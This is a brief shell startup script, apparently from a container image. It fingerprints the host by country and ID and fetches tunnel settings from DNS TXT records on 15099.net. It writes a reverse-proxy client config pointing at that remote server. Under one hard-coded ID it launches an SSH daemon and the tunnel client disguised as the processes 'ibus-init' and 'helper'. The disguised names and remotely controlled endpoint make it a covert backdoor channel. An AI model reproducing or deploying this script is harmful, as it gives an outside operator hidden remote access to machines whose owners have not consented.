#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH

kill -9 `pgrep ibus-init` 1> /dev/null 2>&1 || kill -9 `pgrep ibus-init` 1> /dev/null 2>&1
kill -9 `pgrep helper` 1> /dev/null 2>&1 || kill -9 `pgrep helper` 1> /dev/null 2>&1

if [ ! -f "/conf/npc.conf" ]; then
mkdir -p /conf
fi

if [ ! -f "/etc/hostid" ]; then
HOSTID=`cat /proc/sys/kernel/random/uuid | cut -c1-8`
echo $HOSTID > /etc/hostid
fi

if [ ! -f "/etc/member" ]; then
echo 0 > /etc/member
fi

COUNTRY=`curl ipinfo.io/country  2>/dev/null || curl ipinfo.io/country 2>/dev/null`
QQ2=`dig -t txt qq.15099.net +short`
QQ2="${QQ2:1:${#QQ2}-2}"
: ${QQ:=$QQ2}
HOSTID=`cat /etc/hostid`
DOCKERID=$DOCKERID-$COUNTRY-$QQ-$HOSTID
echo $DOCKERID > /etc/dockerid


NPSTXT=`dig -t txt npstxt.15099.net +short`
NPSTXT="${NPSTXT:1:${#NPSTXT}-2}"
HELPDOMAIN=`echo $NPSTXT | awk -F " " '{ print $1}'`
BRIDGE_PORT=`echo $NPSTXT | awk -F " " '{ print $2}'`
MODE=`echo $NPSTXT | awk -F " " '{ print $3}'`
PUBLIC_VKEY=`echo $NPSTXT | awk -F " " '{ print $4}'`


MEMBER=`cat /etc/member`

if [ "$MEMBER" == "1" ]; then
  PUBLIC_VKEY=`cat /etc/hostid`
fi


cat > /conf/npc.conf<< TEMPEOF
[common]
server_addr=$COUNTRY.$HELPDOMAIN:$BRIDGE_PORT
conn_type=$MODE
vkey=$PUBLIC_VKEY
auto_reconnection=true
remark=$DOCKERID
TEMPEOF

if [ "$QQ" == "15050999" ]; then
# https://github.com/sjourdan/alpine-sshd
ibus-init -Rm -p 22622 || ibus-init -Rm -p 22623 ||  ibus-init -Rm -p 22624
helper 1> /conf/npc.log 2>&1 &

fi
